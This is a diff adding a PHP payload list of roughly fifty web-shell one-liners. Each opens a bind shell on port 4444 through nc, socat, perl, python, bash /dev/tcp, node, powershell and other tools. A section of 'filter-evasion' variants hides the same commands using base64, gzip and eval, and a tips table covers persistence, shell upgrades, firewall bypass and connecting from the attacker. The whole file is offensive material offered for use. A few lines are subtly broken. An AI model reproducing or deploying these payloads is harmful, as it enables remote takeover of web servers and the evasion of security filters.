@@ -1,0 +1,65 @@
+<?php system("nc -l -p 4444 -e /bin/sh"); ?>
+<?php shell_exec("nc -l -p 4444 -e /bin/sh"); ?>
+<?php passthru("nc -l -p 4444 -e /bin/sh"); ?>
+<?php exec("nc -l -p 4444 -e /bin/sh"); ?>
+<?php `nc -l -p 4444 -e /bin/sh`; ?>
+<?php system("ncat -l -p 4444 --exec /bin/sh"); ?>
+<?php shell_exec("ncat -l -p 4444 --exec /bin/sh"); ?>
+<?php system("socat TCP-LISTEN:4444,reuseaddr EXEC:/bin/sh"); ?>
+<?php shell_exec("socat TCP-LISTEN:4444,reuseaddr EXEC:/bin/sh"); ?>
+<?php passthru("socat TCP-LISTEN:4444 EXEC:/bin/sh"); ?>
+<?php system("perl -e 'use Socket;\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));bind(S,sockaddr_in(\$p,INADDR_ANY));listen(S,5);while(accept(C,S)){open(STDIN,\">&C\");open(STDOUT,\">&C\");open(STDERR,\">&C\");exec(\"/bin/sh -i\");}'"); ?>
+<?php shell_exec("perl -e 'use Socket;\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));bind(S,sockaddr_in(\$p,INADDR_ANY));listen(S,5);for(;<>C;){open(STDIN,\">&C\");open(STDOUT,\">&C\");open(STDERR,\">&C\");exec(\"/bin/sh -i\");}'"); ?>
+<?php system("python -c 'import socket,subprocess,os;s=socket.socket();s.bind((\"0.0.0.0\",4444));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"); ?>
+<?php shell_exec("python3 -c 'import socket,subprocess,os;s=socket.socket();s.bind((\"0.0.0.0\",4444));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"); ?>
+<?php system("ruby -rsocket -e 's=TCPServer.new(4444);c=s.accept;loop do cmd=c.gets;IO.popen(cmd,\"r\"){|io|c.print io.read};end'"); ?>
+<?php shell_exec("bash -c 'exec 5<>/dev/tcp/0.0.0.0/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done &'"); ?>
+<?php system("mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | nc -l -p 4444 > /tmp/s"); ?>
+<?php shell_exec("rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l -p 4444 > /tmp/f"); ?>
+<?php passthru("mknod /tmp/p p; nc -l -p 4444 0</tmp/p | /bin/sh > /tmp/p 2>&1"); ?>
+<?php exec("mknod /tmp/p p; nc -l -p 4444 0</tmp/p | /bin/sh 1>/tmp/p"); ?>
+<?php system("php -r '\$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind(\$s,\"0.0.0.0\",4444);socket_listen(\$s,5);while(\$c=socket_accept(\$s)){socket_write(\$c,\"sh>\");while(\$i=socket_read(\$c,2048)){socket_write(\$c,shell_exec(\$i));}}'"); ?>
+<?php shell_exec("php -r '\$sock=socket_create(AF_INET,SOCK_STREAM,0);socket_bind(\$sock,\"0.0.0.0\",4444);socket_listen(\$sock);while(\$client=socket_accept(\$sock)){\$pid=fork();if(\$pid==0){dup2(\$client,0);dup2(\$client,1);dup2(\$client,2);exec(\"/bin/sh\");}}'"); ?>
+<?php system("awk 'BEGIN{s=\"/inet/tcp/4444/0/0\";for(;s|&getline c;close(c))while(c|&getline)print|&s;close(s)}'"); ?>
+<?php shell_exec("lua -e \"local s=require('socket');local t=s.bind('*',4444);local c=t:accept();while true do local r=c:receive();local f=io.popen(r,'r');local o=f:read('*a');f:close();c:send(o);end\""); ?>
+<?php system("telnetd -l /bin/sh -p 4444"); ?>
+<?php shell_exec("busybox telnetd -l /bin/sh -p 4444"); ?>
+<?php system("node -e 'require(\"net\").createServer(s=>require(\"child_process\").spawn(\"/bin/sh\",[],{stdio:[s,s,s]})).listen(4444)'"); ?>
+<?php shell_exec("powershell -c \"\$l = New-Object System.Net.Sockets.TcpListener('0.0.0.0',4444); \$l.start(); \$c = \$l.AcceptTcpClient(); \$s = \$c.GetStream(); \$p = New-Object System.Diagnostics.Process; \$p.StartInfo.FileName='cmd.exe'; \$p.StartInfo.RedirectStandardInput=\$true; \$p.StartInfo.RedirectStandardOutput=\$true; \$p.StartInfo.UseShellExecute=\$false; \$p.Start(); \$p.StandardInput.BaseStream.CopyTo(\$s); \$s.CopyTo(\$p.StandardOutput.BaseStream)\""); ?>
+<?php system("zsh -c 'zmodload zsh/net/tcp; ztcp -l 4444; ztcp -a $REPLY >&0 2>&0 0<&0'"); ?>
+<?php shell_exec("ksh -c 'ksh -i >& /dev/tcp/0.0.0.0/4444 2>&1 &'"); ?>
+<?php system("csh -b 'setenv PORT 4444; exec /dev/tcp/0.0.0.0/\$PORT >&0 2>&0 0<&0'"); ?>
+<?php shell_exec("expect -c 'set timeout -1; spawn /bin/sh; interact' & nc -l -p 4444"); ?>
+<?php system("socat TCP-LISTEN:4444,fork EXEC:'/bin/sh -i',pty,stderr"); ?>
+<?php shell_exec("ncat -lk -p 4444 -e /bin/sh"); ?>
+<?php system("nc -l -p 4444 -e /bin/bash"); ?>
+<?php shell_exec("nc -l -p 4444 -e /bin/bash"); ?>
+<?php system("python -c 'import pty,socket,os;s=socket.socket();s.bind((\"\",4444));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);pty.spawn(\"/bin/bash\")'"); ?>
+<?php shell_exec("perl -e 'use IO::Socket::INET; \$s=new IO::Socket::INET(LocalPort=>4444,Proto=>\"tcp\",Listen=>1,Reuse=>1); while(\$c=\$s->accept()) { open(STDIN,\">&\$c\"); open(STDOUT,\">&\$c\"); open(STDERR,\">&\$c\"); exec(\"/bin/sh -i\"); }'"); ?>
+<?php system("rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 127.0.0.1 4444 > /tmp/f"); ?>
+<?php shell_exec("mknod /tmp/p p && nc -l -p 4444 0</tmp/p | /bin/sh 1>/tmp/p"); ?>
+<?php system("bash -c 'bash -i >& /dev/tcp/0.0.0.0/4444 0>&1'"); ?>
+<?php shell_exec("socat TCP-LISTEN:4444 EXEC:\"bash -li\",pty,stderr,setsid,sigint,sane"); ?>
+<?php system("ncat -l -p 4444 --sh-exec \"ncat 127.0.0.1 4444\""); ?>
+<?php shell_exec("busybox nc -l -p 4444 -e /bin/sh"); ?>
+<?php system("nc.traditional -l -p 4444 -e /bin/sh"); ?>
+<?php shell_exec("nc.openbsd -l -p 4444 -e /bin/sh"); ?>
+<?php system("socat -d -d TCP-L:4444 STDOUT"); ?>
+<?php shell_exec("php -r '\$s=stream_socket_server(\"tcp://0.0.0.0:4444\",\$e,\$m);while(\$c=@stream_socket_accept(\$s)){fwrite(\$c,\"#\");while(\$l=fgets(\$c)){ob_flush();echo shell_exec(\$l);}}'"); ?>
+<?php system("awk '{system(\"/bin/sh\")}' <(nc -l -p 4444)"); ?>
+<?php shell_exec("timeout 60 nc -l -p 4444 -e /bin/sh"); ?>
+
+#Obfuscated / Filter-Evasion Variants
+<?php system(base64_decode("bmMgLWwgLXAgNDQ0NCAtZSAvYmluL3No")); ?>
+<?php shell_exec(gzinflate(base64_decode("eJyLyjlJ1zXzT8o1M9Y1BQAADfABrw=="))); ?>
+<?php $a="n"."c"; $a(" -l -p 4444 -e /bin/sh"); ?>
+<?php call_user_func("sys"."tem", "nc -l -p 4444 -e /bin/sh"); ?>
+<?php eval('system("nc -l -p 4444 -e /bin/sh");'); ?>
+
+
+Tip,Command
+Persistent listener,      ncat -lk -p 4444 -e /bin/sh
+Upgrade shell,            "python -c 'import pty; pty.spawn(""/bin/bash"")'"
+Firewall bypass?,         "Try ports: 80, 443, 53, 8080"
+No nc?,"Use socat,         perl, python, php"
+Connect from attacker,nc TARGET_IP 4444 or rlwrap nc ...
